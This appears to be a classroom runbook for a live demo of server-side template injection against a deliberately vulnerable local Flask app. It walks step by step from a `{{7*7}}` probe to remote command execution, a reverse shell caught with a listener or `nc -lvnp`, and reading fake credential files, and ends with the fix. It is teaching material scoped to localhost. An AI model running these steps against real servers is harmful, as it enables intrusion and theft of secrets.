# LIVE ATTACK RUNBOOK — SSTI → RCE → Reverse Shell
### Topic: Exploitation of Web Application Vulnerabilities

This is the "attack happening live" version. You play the attacker, hit a
vulnerable server you control, and the class watches you go from a normal-looking
web form all the way to an **interactive shell on the victim** where you steal
secret files. That's a real exploitation demo, not a webpage.

> Ethics / scope: the victim is a deliberately vulnerable app **you run on your
> own machine**. Everything stays on localhost. Never aim this at anything you
> don't own.

---

## The 3-terminal layout (arrange these side by side on screen — this IS the look)

```
┌─────────────────────────┐  ┌─────────────────────────┐  ┌─────────────────────────┐
│ TERMINAL 1  — VICTIM     │  │ TERMINAL 2 — ATTACKER   │  │ TERMINAL 3 — ATTACKER   │
│ the server you're hacking│  │ your reverse-shell catch │  │ you fire the exploits   │
│                          │  │                          │  │                          │
│ python3 app.py           │  │ python3 listener.py 4444 │  │ python3 exploit.py ...   │
└─────────────────────────┘  └─────────────────────────┘  └─────────────────────────┘
```

Three small terminals tiled on screen reads instantly as "an attack." If you want
to keep it to two, merge Terminal 2 and 3 (start the listener, then open the
exploit in the same window after).

---

## One-time setup (≈2 min)

```bash
cd ssti-lab
pip3 install -r requirements.txt     # Flask (you already have it)
```

macOS note: use `python3`, not `python`.

---

## The demo, step by step

### ▶ Terminal 1 — start the victim server
```bash
python3 app.py
```
Leave it running. Requests will print here, so the audience sees the server
getting hit in real time.
*Say:* "This is an ordinary web app — a greeting-card generator. It's my target."

### ▶ Step 1 — prove it's injectable (the probe)
In **Terminal 3**:
```bash
python3 exploit.py probe
```
Output: `CONFIRMED: server evaluated our input (49).`
*Say:* "I send `{{7*7}}` as my name. A safe app prints that literally. This one
replied `49` — it executed my input. That's Server-Side Template Injection."

### ▶ Step 2 — Remote Code Execution (run commands on the server)
```bash
python3 exploit.py cmd "id"
python3 exploit.py cmd "whoami"
python3 exploit.py cmd "uname -a"
```
*Say:* "Now I'm not injecting template code — I'm running real operating-system
commands on the server. `id`, `whoami` — that's Remote Code Execution."

### ▶ Step 3 — pop a REVERSE SHELL (the headline)
In **Terminal 2**, start your catcher first:
```bash
python3 listener.py 4444
```
Then in **Terminal 3**, fire the reverse shell:
```bash
python3 exploit.py shell 127.0.0.1 4444
```
**Terminal 2 now shows `GOT SHELL` and gives you an interactive prompt on the
victim.** Type commands live there:
```bash
whoami
ls -la
cat loot/company_secrets.txt
```
*Say:* "The victim just connected back to me and handed me a shell. I'm now
inside the server. Watch — I'll read its secret files." → the DB passwords, Stripe
and AWS keys, and customer record count scroll out.
*Say:* "That's full compromise: data theft, and from here, backdoors or pivoting
deeper into the network. This is why SSTI is rated Critical."

### ▶ Step 4 — the fix (so it's "simulation AND prevention")
Open a browser to the **secure** version: `http://127.0.0.1:5000/secure?name=hi`
Type `{{7*7}}` → it prints literally, nothing runs.
*Say:* "The bug was one line: user input was used as *template code*. The fix is to
pass input as *data* and let the engine auto-escape it. Same payload now does
nothing." (full explanation in `README.md`, section 4.)

---

## If `listener.py` ever misbehaves
You can use netcat instead:
- macOS: `nc -l 4444`
- Linux: `nc -lvnp 4444`
But `listener.py` is the safe bet across machines.

---

## OPTIONAL — make it look like two separate machines (Docker)
Only if you ALREADY have Docker Desktop installed (don't install it now under time
pressure — the 3-terminal version above is plenty convincing).

```bash
# build + run the victim as a container
docker build -t ssti-victim .
docker run --rm -p 5000:5000 ssti-victim          # victim "server"
```
Attack from your host exactly as above, but for the reverse shell the container
must call back to your host:
```bash
python3 exploit.py shell host.docker.internal 4444
```
Now the attack is clearly host → container (separate "machine").

---

## 30-second "why this isn't basic" pitch (if sir asks)
- Severity: ends in **RCE + full shell access + data exfiltration** → Critical (OWASP A03: Injection).
- It's a **live exploit chain** (probe → RCE → reverse shell → loot), not a static page.
- Includes the **root-cause and the fix**, demonstrated.
- Different from XSS: XSS runs in the victim's *browser*; this runs on the *server* and reaches the OS.

## Files
- `app.py` — vulnerable + secure server (`/vulnerable`, `/secure`)
- `exploit.py` — attacker tool: `probe`, `cmd "<command>"`, `shell <ip> <port>`
- `listener.py` — attacker reverse-shell catcher
- `loot/company_secrets.txt` — fake secrets to steal on camera
- `templates/` — app pages
- `Dockerfile` — optional separate-machine setup
- `README.md` — the vulnerability/fix explainer + Q&A prep
